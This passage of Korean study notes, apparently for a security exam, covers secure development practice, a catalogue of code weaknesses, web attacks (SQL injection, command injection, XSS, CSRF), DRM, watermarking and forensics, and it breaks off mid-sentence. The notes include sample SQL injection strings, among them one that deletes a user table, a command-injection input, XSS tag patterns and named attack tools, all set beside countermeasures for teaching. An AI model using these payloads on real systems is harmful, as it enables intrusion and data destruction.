보안 가이드를 래퍼런스로 하여 개발 환경에 적합하도록 구축 ⦁ 표준 코딩 가이드는 사이트마다 작성 소스코드 보안 약점 진단(도구 활용)                                Secure SDLC                                  방법론           내용                                           CLASP           ⦁ OWASP의 보안 약점을 고려한 개발 보안 방법론 ⦁ 개념, 역할, 활동을 정의한 모델                             MS-SDL           ⦁ PreSDL 단계에서 위협분석을 수행하고, ‘분석, 설계, 구현, 테스트’의 SDLC 단계에서 보안을 고려한 모델링을 수행 ⦁ Microsoft의 자동화 진단 도구로 활용                             7-Touch Point           위협분석, 코드리뷰, 자동화 진단 등의 활동을 정의                           2. 분석/설계단계 개발 보안 활동  1. 분석단계 활동     개요            ‘처리 대상 정보’와 ‘해당 정보를 처리하는 기능’을 대상으로, 적용해야 하는 보안 항목을 식별       사용자 권한 : 권한을 가진 사용자만이 안전하게 수집, 전송, 처리, 보관, 폐기해야 하는 정보를 식별한다.       법/제도 : 개인정보보호법, 정보통신망법, 금융거래법 등 다양한 법, 제도, 규정에 의하여 보호해야 하는 정보를 정의한다.       보안정책 : 내부정책(개인정보보호 규정, 정보보안 규정)과 외부정책(관련 지침) 자료 등을 기준으로 보안 항목을 식별한다.           요구사항1 : 입력 데이터 검증 및 표현 (10개 항목)            DBMS 조회 및 결과 검증                    SQL문 생성 시 사용하는 입력값과 쿼리 결과에 대한 검증 방법을 설계           유효하지 않은 값에 대한 처리 방법을 설계                       XML 조회 및 결과 검증                    XPath, XQuery 생성 시 사용하는 입력값과 조회 결과에 대한 검증 방법을 설계           유효하지 않은 값에 대한 처리 방법을 설계                       디렉터리 서비스 조회 및 결과 검증                    LDAP 생성 시 사용하는 입력값과 조회 결과에 대한 검증 방법을 설계           유효하지 않은 값에 대한 처리 방법을 설계                       시스템 자원 접근 및 명령어 수행 입력값 검증                    시스템 자원 접근 및 명령어 수행을 위해 사용하는 입력값과 조회 결과에 대한 검증 방법을 설계           유효하지 않은 값에 대한 처리 방법을 설계                       웹 서비스 요청 및 결과 검증                    웹 서비스 요청과 응답 결과에 대한 검증 방법과 적절하지 않은 데이터에 대한 처리 방법을 설계           예) 게시판에 스크립트 게시 후 게시 항목 응답                       웹 기반 중요 기능 수행요청 유효성 검증                    사용자 권한 확인이 필요한 중요 기능 및 서비스 요청에 대한 유효성 검증 방법을 확인           유효하지 않은 요청에 대한 처리 방법을 설계(예: 결제 기능에 대한 인증)                       HTTP 프로토콜 유효성 검증                    사용자가 원하지 않은 결과를 생성할 수 있는 HTTP 헤더 및 응답 결과에 대한 유효성을 검증하는 방법을 설계           유효하지 않은 요청의 처리 방법을 설계 (예: 비정상적인 HTTP 헤더, 자동연결 URL 링크)                       허용된 범위 내 메모리 접근                    허용된 범위의 메모리 버퍼에만 접근하여 저장 및 읽기를 수행하고 버퍼오버플로우가 발생하지 않도록 처리 방법을 설계                       보안기능 동작에 사용되는 입력값 검증                    보안기능 동작을 위해 사용하는 입력값과 함수의 외부 입력값 및 수행결과에 대한 처리 방법을 설계 (예: 인증, 인가, 권한부여 등의 보안 기능)                       업로드/다운로드 파일 검증                    업로드/다운로드 파일의 무결성, 실행권한 등에 관한 유효성 검사 방법과 검사 대응 방안을 설계                           요구사항2 : 보안기능(8개 항목)            인증 대상 및 방식                    중요 정보 및 기능과 인증방식을 정의하고, 정보접근과 중요 기능 수행 시 인증 기능을 우회할 수 없도록 설계                       인증 수행 제한                    반복적인 인증 시도를 제한하도록 설계           인증실패 시 인증제한 기능을 설계                       비밀번호 관리                    안전한 비밀번호 조합규칙을 설정하고 주기적으로 변경하도록 설계 (예: 패스워드 길이, 허용문자 조합 및 하드코딩 금지)                       중요 자원 접근 통제                    중요 자원을 정의하고, 정의한 중요 자원에 대한 접근을 통제하는 신뢰할 수 있는 방법과 접근 통제 실패 시 대응방안을 설계 (예: 주요 설정, 민감정보에 대한 접근 권한)                       암호키 관리                    암호키의 생성, 분배, 접근, 파기 등 암호키 생명주기를 안전하게 관리할 수 있는 방법을 설계                       암호연산                    국제표준 혹은 검증된 프로토콜로 인정된 안전한 암호 알고리즘을 서정하여, ‘충분한 암호키 길이’, ‘솔트’, ‘충분한 난수값’에 기반한 암호연산의 수행 방법을 설계                       중요 정보 저장                    중요 정보 저장 시, 안전한 저장 및 관리 방법을 설계 (예: 패스워드, 개인정보, 민감정보)                       중요 정보 전송                    중요 정보 전송 시, 안전한 전송 방법을 설계 (예: 정책에 의하여 중요 정보로 분류한 정보)                           요구사항3 : 에러처리(1개 항목)            예외처리                    오류 메시지에 중요 정보가 포함되어 출력되거나, 에러 및 오류가 부적절하게 처리되어 의도하지 않은 상황이 발생하는 것을 방지하기 위하여 안전한 처리 방법을 설계 (예: 개인정보, 시스템정보 등의 노출 방지)                           요구사항4 : 세션통제(1개 항목)            세션통제                    세션을 안전하게 관리할 수 있는 방법을 설계 (예: 세션간 데이터 공유금지, 세션 ID 노출 방지, 재로그인시 세션 ID 변경, 세션 유효기간 등)                           2. 설계단계의 보안 요구 사항 적용     요구사항정의서의 보안 기능 요구사항 확인   요구사항 추적표를 활용한 SDLC 단계별 산출물 확인   적절한 보안대책 반영여부를 진단   3. 구현단계 개발 보안 활동 (보안약점)     소스코드 보안 취약점 7개     1. 입력데이터 검증 및 표현       프로그램 입력 값에 대한 검증 누락 또는 부적절한 검증, 데이터의 잘못된 형식 지정으로 인해 발생할 수 있는 보안 약점   SQL 삽입 : 사용자의 입력 값 등 외부 입력 값이 SQL 쿼리에 삽입되어 공격자가 쿼리를 조작해 공격할 수 있는 보안 약점   경로조작 및 자원 삽입 : 외부 입력 값에 대한 검증이 없거나 혹은 잘못된 검증을 거쳐서 시스템 자원에 접근하는 경로 등의 정보로 이용될 때 발생하는 보안 약점   크로스사이트스크립트 : 검증되지 않은 외부 입력 값에 의해 브라우저에서 악의적인 코드가 실행되는 보안 약점   운영체제 명령어 삽입 : 운영체제 명령어를 구성하는 외부 입력 값이 적잘한 필터링을 거치지 않고 쓰여서 공격자가 운영체제 명령어를 조작할 수 있는 보안 약점   위험한 형식 파일 업로드 : 파일의 확장자 등 파일 형식에 대한 검증 없이 업로드를 허용하여 발생하는 보안 약점   신뢰되지 않은 URL 주소로 자동 접속 연결 : 사용자의 입력 값 등 외부 입력 값이 링크 표현에 사용되고, 이 링크를 이용하여 악의적인 사이트로 리다이렉트(Redirect)되는 보안 약점   XQuery 삽입 : 사용자의 입력 값 등 외부 입력 값이 XQuery 표현에 삽입되어 악의적인 쿼리가 실행되는 보안 약점   XPath 삽입 : 사용자의 입력 값 등 외부 입력 값이 XPath 표현에 삽입되어 악의적인 쿼리가 실행되는 보안 약점   LDAP 삽입 : 검증되지 않은 입력 값을 사용해서 동적으로 생성된 LDAP문에 의해 악의적인 LDAP 명령이 실행되는 보안 약점   크로스사이트 요청 위조            검증되지 않은 외부 입력 값에 의해 브라우저에서 악의적인 코드가 실행되어 공격자가 원하는 요청(Request)이 다른 사용자(관리자 등) 권한의 서버로 전송되는 보안 약점       지정된 경로 밖의 파일 시스템 경로에 접근하게 되는 보안 약점           HTTP 응답 분할 : 사용자의 입력 값 등 외부 입력 값이 HTTP 응답 헤더에 삽입되어 악의적인 코드가 실행되는 보안 약점   정수 오버플로 : 정수를 사용한 연산의 결과가 정수값의 범위를 넘어서는 경우 프로그램이 예기치 않게 동작할 수 있는 보안 약점   보안기능 결정에 사용되는 부적절한 입력값 : 사용자에 의해 변경될 수 있는 값을 사용하여 보안 결정(인증/인가/권한부여 등)을 수행하여 보안 매커니즘이 우회될 수 있는 보안 약점   메모리 버퍼 오버플로 : 버퍼를 이용하여 메모리를 사용할 때, 버퍼의 크기보다 큰 데이터를 버퍼에 기록하는 경우 데이터가 버퍼의 경계를 넘어 다른 메모리 영역을 침범하기 때문에 발생하는 보안 약점   포맷 스트링 삽입 : printf(), fprintf(), sprintf() 와 같이 포맷 스트링을 사용하는 함수를 사용하는 경우, 외부로부터 입력된 값을 검증하지 않고 입출력 함수의 포맷 문자열 그대로 사용하는 경우 발생할 수 있는 보안약점   2. 보안 기능     보안 기능(인증, 접근 제어, 기밀성, 암호화, 권한 관리 등)을 적절하지 않게 구현 시 발생할 수 있는 보안 약점   적절한 인증 없는 중요 기능 허용 : 적절한 인증 없이 중요 정보(계좌이체 정보, 개인정보 등)를 열람(또는 변경)할 수 있도록 하는 보안 약점   부적절한 인가 : 적절한 접근 제어 없이 외부 입력 값을 포함한 문자열로 서버 자원에 접근(혹은 서버 실행 인가)할 수 있게 하는 보안 약점   중요한 자원에 대한 잘못된 권한 설정 : 중요 자원(프로그램 설정, 민감한 사용자 데이터 등)에 대한 적절한 접근 권한을 부여하지 않아 의도하지 않은 사용자에 의해 중요 정보가 노출,수정되는 보안 약점   취약한 암호화 알고리즘 사용 : 중요 정보(패스워드, 개인정보 등)의 기밀성을 보장할 수 없는 취약한 암호 알고리즘을 사용하여 정보가 노출될 수 있는 보안 약점   중요 정보 평문저장 : 중요 정보(패스워드, 개인정보, 사용자 권한 정보 등)를 암호화하여 저장하지 않아 발생할 수 있는 보안 약점   중요 정보 평문전송 : 중요 정보(패스워드, 개인정보, 사용자 권한 정보 등) 전송 시 암호화하거나 암호화 채널을 통하지 않는 경우 발생할 수 있는 보안 약점   하드코드 된 비밀번호 : 소스코드 내에 비밀번호를 하드코딩함에 따라 관리자 비밀번호가 노출되거나 주기적 변경 등 수정(관리자 변경 등)이 쉽지 않은 보안 약점   충분하지 않은 키 길이 사용 : 데이터의 기밀성, 무결성 보장을 위해 사용되는 키의 길이가 충분하지 않아 기밀정보 누출, 무결성이 깨지는 보안 약점   적절하지 않은 난수 값 사용 : 예측 가능한 난수 사용으로 공격자로 하여금 다음 숫자 등을 예상하여 시스템 공격이 가능한 보안 약점   하드코드 된 암호화 키 : 소스코드 내에 암호화 키를 하드코딩 하는 경우 향후 노출될 수 있으며, 키 변경 등 수정이 쉽지 않은 보안 약점   취약한 비밀번호 허용 : 비밀번호 조합규칙(영문, 숫자, 특수문자 등) 및 길이가 충분하지 않아 노출될 수 있는 보안 약점   사용자 하드디스크에 저장되는 쿠키를 통한 정보 노출 : 쿠키(세션 ID, 사용자 권한 정보 등 중요 정보)를 사용자 하드디스크에 저장함으로써 개인정보 등 기밀정보가 노출될 수 있는 보안 약점   주석문 안에 포함된 패스워드 등 시스템 주요 정보 : 소스코드 내의 주석문에 비밀번호가 하드코딩 되어 비밀번호가 노출될 수 있는 보안 약점   비밀번호 일방향 해시 함수 사용 : 공격자가 솔트 없이 생성된 해시값을 얻게 된 경우, 미리 계산된 레인보우 테이블을 이용하여 원문을 찾을 수 있는 보안 약점   무결성 검사 없는 코드 다운로드 : 원격으로부터 소스코드 또는 실행파일을 무결성 검사 없이 다운로드 받고 이를 실행하는 경우 공격자가 악의적인 코드를 실행할 수 있는 보안 약점   반복된 인증시도 제한 기능 부재 : 프로그램 내에서 로그인과 같은 인증시도를 하는 수를 제한하지 않거나 인증시도에 대한 측정을 구현하지 않아서 발생하는 보안 약점   3. 시간 및 상태     동시 또는 거의 동시 수행을 지원하는 병렬 시스템, 하나 이상의 프로세스가 동작하는 환경에서 시간 및 상태를 부적절하게 관리하여 발생할 수 있는 보안 약점   경쟁조건-검사시점과 사용시점(TOCTOU) : 멀티프로세스 상에서 자원을 검사하는 시점과 사용하는 시점이 달라서 발생하는 보안 약점   제어문을 사용하지 않는 재귀함수 : 적절한 제어문 사용이 없는 재귀함수에서 무한 재귀가 발생하는 보안 약점   4. 에러처리     에러를 처리하지 않거나, 불충분하게 처리하여 에러정보에 중요 정보(시스템 등)가 포함될 때 발생할 수 있는 보안 약점   오류 메시지를 통한 정보 노출 : 개발 시 활용을 위한 오류정보의 출력 메시지를 배포될 버전의 S/W에 포함시킬 때 발생하는 보안 약점   오류 상황 대응 부재 : 시스템에서 발생하는 오류 상황을 처리하지 않아 프로그램 다운 등 의도하지 않은 상황이 발생할 수 있는 보안 약점   적절하지 않은 예외 처리 : 예외에 대한 부적절한 처리로 인해 의도하지 않은 상황이 발생할 수 있는 보안 약점   5. 코드 오류     타입변환 오류, 자원(메모리)의 부적절한 반환 등과 같이 개발자가 범할 수 있는 코딩오류로 인해 유발되는 보안 약점   널(Null) 포인터 역참조 : Null로 설정된 변수의 주소값을 참조했을 때 발생하는 보안 약점   부적절한 자원 해제 : 사용된 자원을 적절히 해제하지 않으면 자원의 누수 등이 발생하고, 자원이 모자라 새로운 입력을 처리하지 못하는 보안 약점   해제된 자원 사용 : 메모리를 해제한 자원을 참조할 경우, 예기치 않은 오류가 발생할 수 있는 보안 약점   초기화되지 않은 변수 사용 : 변수를 초기화하지 않고 사용하는 경우 예기치 않은 오류가 발생할 수 있는 보안 약점   6. 캡슐화     중요한 데이터 또는 기능성을 불충분하게 캡슐화하였을 때 인가되지 않은 사용자에게 데이터 누출이 가능해지는 보안 약점   잘못된 세션에 의한 데이터 정보 노출 : 잘못된 세션에 의해 권한 없는 사용자에게 데이터 노출이 일어날 수 있는 보안 약점   제거되지 않고 남은 디버그 코드 : 디버깅을 위해 작성된 코드를 통해 권한 없는 사용자의 인증우회(또는 중요 정보) 접근이 가능해지는 보안 약점   시스템 데이터 정보 노출 : 사용자가 볼 수 있는 오류 메시지나 스택 정보에 시스템 내부 데이터나 디버깅 관련 정보가 공개되는 보안 약점   Public 메소드로부터 반환된 Private 배열 : private로 선언된 배열을 public으로 선언된 메소드를 통해 반환(return)하면 그 배열의 레퍼런스가 외부로 공개되어 외부에서 배열이 수정될 수 있는 보안 약점   Private 배열에 Public 데이터 할당 : public으로 선언된 데이터 또는 메소드의 인자가 private 선언된 배열에 저장되면 private 배열을 외부에서 접근할 수 있게 되는 보안 약점   7. API 오용     의도된 사용에 반하는 방법으로 API를 사용하거나 보안에 취약한 API를 사용할 때 발생할 수 있는 보안 약점   DNS lookup 에 의존한 보안 결정 : DNS는 공격자에 의해 DNS 스푸핑 공격 등이 가능하므로 보안 결정을 DNS 이름에 의존할 경우, 보안 결정 등이 노출되는 보안 약점   취약한 API 사용 : 취약하다고 알려진 함수를 사용할 경우 예기치 않은 오류가 발생할 수 있는 보안 약점   4. SQL Injection  1. SQL Injection     개요            WHERE ID = '1' ... : 1을 파라미터 입력한 정상 구문       WHERE ID = '' OR 1=1 # : ’ OR 1=1 # 을 입력하여 공격           SQL Injection의 특징            개념                    사용자가 서버에 제출한 데이터가 SQL Query로 사용되어 데이터베이스 및 응용 시스템에 영향을 주는 공격기법           SQL문을 조작하거나 오류를 발생시켜 정보를 유출하거나 변조           OWASP TOP 10에서 가장 위험한 공격 기법 중 하나                       발생 원인                    공격자의 입력 값이 데이터베이스의 쿼리 작성에 이용되는 환경에서 입력 값 미검증 또는 부적절한 검증           동적으로 Query 구문이 완성되는 애플리케이션                       결과                    쿼리 조작을 통한 데이터베이스 노출 및 변조           웹 애플리케이션 인증 우회           데이터베이스 덤프, 파괴           시스템 커맨드의 실행 (MS-SQL)           시스템 주요 파일 노출           DDoS 공격                       공격 도구                    Havij           Pangolin           HDSL                       대응 방안                    입력 값 필터링           입력 값 크기 제한           Dynamic SQL 지양           ORM 사용 지향           Prepared Statement 사용           데이터 타입 패턴 체크           데이터베이스 권한 관리           공통 오류 페이지 사용(오류 반환 설정)           WAS/IDS           Stored Procedure 사용                           2. Blind SQL Injection     개요            문자열을 하나씩 자르고 ASCII 코드 값을 입력하여 해당 문자열을 완성하는 공격 기법       SQL 실행결과가 True / False 로 오기 때문에 입력해본 문자열이 맞는지 틀린지 공격자가 알 수 있음           SQL Injection의 유형            인증 우회                    취약한 인증방식(ID/PW를 입력받아 ID와 PW가 일치하는 레코드가 존재하는지 검사하는 방식)에서 SQL문을 조작하여 PW를 무력화           WHERE 절 이하의 조건이 항상 참이 되도록 하고, 쿼리 문에 에러가 없어야 함                            인증용 SQL문 : SELECT * FROM USER WHERE ID=\"입력 값\" AND PW=\"입력 값\";               변조된 SQL문 : SELECT * FROM USER WHERE ID='' OR '1'='1' AND PW=''--               변조된 SQL문 : SELECT * FROM USER WHERE ID='NAME'; DELETE FROM USER--                                               Blind SQL Injection                    SQL Injection에 대응하기 위해 내부 데이터베이스 오류를 보여주지 않도록 설정한 경우, 참과 거짓을 구분할 수 있는 구문을 만들어 데이터를 알아내는 방법           SQL Injection에서 데이터를 삽입 및 수정하려면 DB 스키마를 먼저 파악해야 함 (DB 이름, 테이블 명, 컬럼명, 컬럼타입 순)                            변조된 SQL문 : ' AND SUBSTRING(DB_NAME(),1,1)='W'                                               Mass SQL Injection                    한 번의 공격으로 대량의 DB값이 변조되어 서비스에 치명적인 악영향을 끼치는 확장된 개념의 SQL Injection 공격 기법           Cookie Injection : Get/Post가 아닌 Cookie를 통해 데이터가 전달되는 방식으로, 대부분의 WAF(Web Application Firewall)에서 조차 Get/Post 방식만을 검사하기 때문에 우회할 수 있는 통로로 활용되어 Mass SQL Injection 공격에 활용될 수 있음                           3. Union SQL Injection     개념            SQL 문에 union을 입력해서 원하는 테이블에 접근       ' UNION SELECT FIRST_NAME, 2 FROM USERS #           4. JAVA 언어에서 SQL Injection 대응 방안     preparedStatement 이용            String name = request.getParamenter(\"name\");       String query = \"SELECT * FROM USER WHERE NAME=?\";       PreparedStatement pstmt = con.prepareStatement(query);       pstmt.setString(1, name);       rs = stmt.executeQuery();           5. 운영체제 명령어 삽입     운영체제 명령어 삽입 (Command Injection)            입력 값을 검증하지 않아서 운영체제 명령어를 실행할 수 있는 취약점       shell_exec 함수 사용       코드 : shell_exec('ping ', $target );       입력값 : 192.168.0.10 | ls           JAVA 언어에서 운영체제 명령어 삽입 대응방안            취약 코드                    String cmd = new String(\"cmd.exe /K manDB.bat\");           Runtime.getRuntime().exec(cmd + \"c:\\\\data\\\\\" + version);                       입력값 검증 후 대입해야 함           6. 위험한 파일형식 업로드     개요            스크립트가 실행될 수 있는 프로그램을 업로드하여 악성 스크립트를 실행하게 함       이런 스크립트를 웹쉘(Web Shell) 이라고 함       코드와 같은 형태를 게시판을 통해 업로드하고 url 호출하여 서버에 명령을 실행           대응 방안            탐지된 파일 삭제       업로드 확장자 체크       업로드 파일 이름 변경, 이동 및 실행권한 제거           7. XSS(Cross Site Scripting)  1. XSS(크로스 사이트 스크립팅) 개요          개요              이미지 출처              공격자가 제공한 실행 가능한 코드를 재전송하도록 하는 공격 기법       서버를 장악하지 않고도 사용자 정보가 유출될 수 있으며, 필터링을 우회할 수 있는 다양한 방법이 존재       OWASP TOP 10 에서 가장 위험한 공격 기법 중 하나           발생 원인            사용자로부터 입력된 데이터에 대한 부적절한 검증을 통하여 웹 도큐먼트로 출력       서버를 경유하여 조작된 웹 페이지 및 URL을 열람하는 클라이언트를 공격           결과            개인정보 유출       Cookie Access       DOM(Document Object Mode) Access 를 통한 페이지 조작       Clipboard Access       Key logging       악성코드 실행 및 세션 하이제킹           대응 방안            서버 측면                    사용자 입력 문자열에서 &lt;. &gt;, &amp;, \" 등을 replace 와 같은 문자변환 함수나 메소드로 &amp;lt, &amp;gt, &amp;amp, &amp;quot 로 치환           HTML tag 리스트 선정과 해당 태그만 허용 (White list)           보안성이 검증된 API를 사용해 위험한 문자열 제거(OWASP의 ESAPI 활용)           입력값 검증 - 서버에서 White List 방식 필터링           출력 값 인코딩 - HTML 인코딩 출력           HTML 포맷 입력 페이지 최소화           중요 정보 쿠키 저장 지양           인증강화 - 세션과 IP를 통합하여 서버에서 인증                            TCP 연결은 세션값만 확인                                   스크립트에 의한 쿠키 접근 제한                       클라이언트 측면                    주기적 패스워드 변경           브라우저 최신 패치           링크 클릭 대신 URL 직접 입력           브라우저 보안 옵션 등급 상향(쿠키 사용 금지)                           2. XSS의 종류     Stored XSS            게시판에 악성 스크립트를 올리고 사용자가 클릭하면 악성 스크립트를 실행           Reflected XSS            메일로 악성 스크립트가 포함된 첨부파일을 사용자에게 전송       해당 첨부파일을 열면 악성스크립트를 포함한 요청이 취약점이 있는 웹 서버에 전송       악성 스크립트를 포함한 응답을 웹 서버로부터 받음       악성 스크립트는 서버에 저장되지 않음           3. XSS의 공격 대상                  항목       내용                       XSS에 취약한 웹 페이지       ⦁ HTML을 지원하는 게시판 ⦁ Search Page ⦁ Personalize Page ⦁ Join Form Page ⦁ Referer를 이용하는 Page ⦁ 기타 사용자로부터 입력받아 화면에 출력하는 모든 페이지에서 발생                 XSS 공격       이용 HTML Tag (예: &lt;script&gt;,&lt;object&gt;,&lt;applet&gt;,&lt;embed&gt;,&lt;img&gt;) 언어/스크립트 : Javascript, VB Script, Active X, HTML, Flash 대상 코드의 위치 : URL parameter, Form elements, Cookie, DB Query 등                  사례       &lt;script&gt;...&lt;/script&gt; &lt;img src=\"javascript : ...\"&gt; &lt;div style=\"background-image : url(javascript...)\"&gt;&lt;/div&gt; &lt;embed&gt;...&lt;/embed&gt; &lt;iframe&gt;...&lt;/iframe&gt;           4. XSS에 안전한 JAVA 소스코드     취약한 소스코드            &lt;p&gt;NAME : &lt;%=name%&gt;&lt;/p&gt;           안전한 소스코드            name = name.replaceAll(\"&lt;\", \"&amp;lt;\");       name = name.replaceAll(\"&gt;\", \"&amp;gt;\");       name = name.replaceAll(\"&amp;\", \"&amp;amp;\");       name = name.replaceAll(\"\"\", \"&amp;quot;\");       &lt;p&gt;NAME : &lt;%=name%&gt;&lt;/p&gt;           8. CSRF(Cross Site Request Forgery, 크로스 사이트 요청 위조)     개념            어플리케이션 취약점 중 하나로 인터넷 사용자(희생자)가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격       피해자에 대해 사용자가 인식하지 못한 상황에서 의도하지 않은 공격 행위를 수행하게 하는 공격       세션쿠키, SSL 인증서 등 자동으로 입력된 신뢰정보를 기반으로 사용자의 요청을 변조하여 해당 사용자의 권한으로 악의적 공격 수행       사용자를 통해 공격이 이루어지기 때문에 공격자 추적이 불가능       세션 라이딩, 원 클릭 공격, 악의적 연결, 자동화된 공격, SEA SURF, IFRAME EXPLOIT 등으로 불림           과정            악성 스크립트가 포함된 스크립트를 웹 서버에 올림       사용자는 악성 스크립트가 포함된 스크립트를 요청       악성 스크립트는 웹 서버에 서비스를 요청       사용자는 이미 인증을 받았기 때문에 정상적인 사용자가 웹 서버를 공격하게 됨           예제            위조 요청을 전송하는 서비스에 사용자가 로그인한 상태       사용자가 해커가 만든 피싱 사이트에 접속 혹은 XSS 공격을 성공한 정상 사이트를 통해 CSRF 공격을 수행                주요 특징                                  구분           내용                                           발생원인           ⦁ 웹 서버에 외부의 입력 값에 대한 인증서 등을 저장하여 해당 내용을 열람하게 할 경우 발생 ⦁ 이메일, 특정 웹사이트 접속 사용자 등이 웹사이트 정보를 로딩하는 과정에서 다른 URL을 요청하게 함                             결과           관리자 계정인 경우 권한 관리, 게시물 삭제, 사용자 등록 및 삭제                             대응 방안           ⦁ 입력 폼 작성 시 POST 방식을 사용 ⦁ 입력 폼과 해당 입력 처리 프로그램 간에 토큰을 사용 ⦁ 중요한 기능에 대해 세션 검증과 재인증 처리 또는 트랜잭션 서명을 수행 ⦁ referrer 검증                           9. 포맷 스트링(Format String)     개요            데이터에 대한 포맷 스트링을 정확하게 정의하지 않아서 발생되는 보안 취약점       printf 함수에 의해서 해석되는 문자열 “str”은 문자열이 아니라 형식 지시자를 포함한 포맷스트링으로 인식       버퍼 오버플로우처럼 가장 심각한 보안 취약점       포맷 스트링 문자를 사용한 메모리 열람, 메모리 변조, 셀코드(Shell Code) 삽입과 같은 보안 취약점이 발생       대상 함수 목록                    Fprintf           printf           sprintf           snprintf           vfprintf           vprintf           vsprintf           syslog                           DRM 기술 개념 및 활용  1. DRM(Digital Rights Management) 개요     DRM(Digital Rights Management)            디지털 컨텐츠를 안전하게 보호할 목적으로 암호화 기술을 이용       허가되지 않은 사용자로부터 컨텐츠 저작권 관련 당사자의 권리 및 이익을 지속적으로 보호 및 관리하는 시스템           DRM 요소 기술            암호화 : 대칭키 및 비대칭키 암호화 기술       인증 : 정당한 사용자 식별을 위한 인증       Watermarking : 원저작권 정보 삽입 및 식별 수행       사용자 Repository : 정당한 사용자 및 라이선스 정보 저장       사용자 권한 관리 : 열람 및 배포에 대한 권리, 편집, 복사, 다운로드 등의 권한 관리       Temper Proofing : 불법 수정 여부를 검증, Cracking 을 방지           2. DRM 처리방식          DRM 개념도              이미지 출처       Watermarking  1. 워터마킹(Watermarking)     디지털 정보에 사람이 인지할 수 없는 마크를 삽입   디지털 컨텐츠에 대한 소유권을 추적할 수 있는 기술   정보은닉기술   오디오, 비디오, 이미지 등의 디지털 데이터에 삽입되는 또 다른 디지털 데이터로 Steganography 기법 중 하나   2. 워터마킹 특징                  기술적 특징       주요 내용                       비인지성(Fidelity)       사용자의 워터마크 정보 인지 불가, 데이터 품질 저하 없음                 강인성(Robustness)       변형에 대한 견고성 유지, 삽입 정보 제거불가                 연약성(effeminacy)       컨텐츠 복제와 관계없이 워터마크 복제 불가능                 위조방지(Tamper-resistance)       워터마크를 삭제하려는 고의적인 신호에 제거되지 않아야 함                 키 제한(Key-resistance)       소수의 사용자만 워터마크를 추출할 수 있는 키 제공           3. Wartermarking 공격 기법     Filtering Attack : 워터마크를 노이즈로 보고 노이즈 제거 방법을 활용   Copy Attack : 임의의 신호를 추가하여 워터마크를 사용하지 못하게 함   Mosaic Attack : 워터마크가 검출되지 않도록 작은 조각으로 분해하여 다시 합침   Template Attack : 워터마크의 패턴을 파괴하여 검출되지 않도록 함   4. 핑거프린트(Fingerprint)     워터마킹 기법 중 하나   디지털 컨텐츠 원저작자 정보(판매자)와 함께 구매자 정보도 삽입   디지털 컨텐츠가 불법적으로 유통될 때 불법적으로 유통시킨 구매자를 확인할 수 있는 디지털 컨텐츠 추적기술   Dual Watermark 라고도 함   구매자가 다르더라도 컨텐츠 내용 자체는 동일함   포렌식(Forensic) 개요  1. 디지털 포렌식(Digital Forensic)  1. 정의     디지털 기기를 대상으로 발생하는 특정 행위의 사실관계를 법정에서 증명하기 위한 방법 및 절차   과학수사 및 수사과학 분야에서 디지털 기기를 대상으로 하는 기술   2. 디지털 증거휘발성                  용어       내용                       디지털 증거       컴퓨터 또는 기타 디지털 저장매체에 저장되거나 네트워크를 통해 전송 중인 자료로서 조사 및 수사업무에 필요한 증거자료를 말한다.                 디지털 증거분석       컴퓨터 또는 기타 디지털 저장매체(네트워크를 통해 전송 중인 자료를 포함)에 남아있는 자료에 대한 원본 보존과 사건 관련 증거를 과학적인 절차를 통하여 추출, 검증, 판단하는 조사 및 수사과정                 휘발성 증거       컴퓨터 실행 시 일시적으로 메모리 또는 임시파일에 저장되는 증거로 네트워크 접속상태, 프로세스 구동상태, 사용중인 파일 내역 등 컴퓨터 종료와 함께 삭제되는 디지털 증거이다.                 비휘발성 증거       컴퓨터 종료 시에도 컴퓨터 또는 기타 디지털 저장매체에 삭제되지 않고 남아있는 디지털 증거이다.           3. 디지털 포렌식 원칙                  기본원칙       내용                       정당성 원칙       ⦁ 증거가 적법절차에 의해 수집되었는가? ⦁ 위법수집 증거 배제법칙: 위법절차를 통해서 수집된 증거는 증거 능력이 없다(즉, 해킹을 통해서 수집된 증거) ⦁ 독수 독과(과실)이론: 위법하게 수집된 증거에서 얻어진 2차 증거도 증거능력이 없다(불법적인 해킹을 통해서 얻은 패스워드로 특정파일을 복호화하여 얻은 증거)                 재현원칙       ⦁ 같은 조건과 상황 하에서 항상 같은 결과가 나오는가? ⦁ 불법 해킹 용의자의 해킹 툴이 증거능력을 가지기 위해서는 같은 상황의 피해 시스템에 툴을 적용할 경우 피해결과와 일치하는 결과가 나와야 한다.                 신속성 원칙       ⦁ 디지털 포렌식의 전 과정이 신속하게 진행되었는가? ⦁ 휘발성 데이터의 특성 상 수사진행의 신속성에 따라 증거수집 가능여부가 달라진다.                 절차 연속성 원칙       ⦁ 증거물 수집, 이동, 보관, 분석, 법정제출의 각 단계에서 담당자 및 책임자가 명확해야 한다. ⦁ 수집된 저장매체가 이동단계에서 물리적 손상이 발생하였다면, 이동 담당자는 이를 확인하고 해당 내용을 정확히 인수인계하여 이후의 단계에서 적절한 조치가 취해지도록 해야 한다.                 무결성 원칙       ⦁ 수집된 증거가 위변조되지 않았는가? ⦁ 일반적으로 해시 값을 이용하여 수집 당시 저장매체의 해시 값과 법정 제출 시 저장매체의 해시 값을 비교하여 무결성을 입증해야 한다.              디지털 포렌식 도구            Encase, FTK           2. 휘발성 및 비휘발성 데이터  1. 휘발성 및 비휘발성 정보                  휘발성       비휘발성                       ⦁ 램슬랙 영역 ⦁ 램 비할당 영역 ⦁ 네트워크 설정 값 ⦁ 네트워크 연결정보 ⦁ 실행 중인 프로세스 ⦁ 열려진 파일 ⦁ 로그인 세션 ⦁ 운영체제 시간       ⦁ 설정 값 ⦁ 로그 ⦁ 애플리케이션 파일 ⦁ 데이터 파일 ⦁ 스왑 파일 ⦁ 덤프 파일 ⦁ 하이버네이션 파일 ⦁ 임시 파일           2. 휘발성 데이터     종류            현재 컴퓨터 시스템 날짜 및 시간       현재 컴퓨터 시스템에서 실행되는 프로세스 정보       현재 컴퓨터 시스템 접속자       오픈된 포트       현재 실행되고 있는 프로그램       컴퓨터 시스템 최근 접속기록           고려사항            휘발성 데이터는 전원이 차단되면 데이터가 손실됨 -&gt; 우선순위 고려       동작 중인 시스템 메모리 내 존재하는 데이터를 수집해야 함       netstat 을 활용한 네트워크 연결상태 정보       윈도우 클립보드에 저장된 정보           휘발성 데이터 수집 우선순위            Register 및 Cache 정보       Routing Table, ARP Cache, Process Table, Kernel Statistics       Memory       Temporary File Systems       Disk       Remote Logging 과 Monitoring Data       Physical Configuration, Network Topology       Archival media           3. 비휘발성 데이터     고려사항            전원이 차단되어도 데이터 손실이 발생되지 않는 데이터로 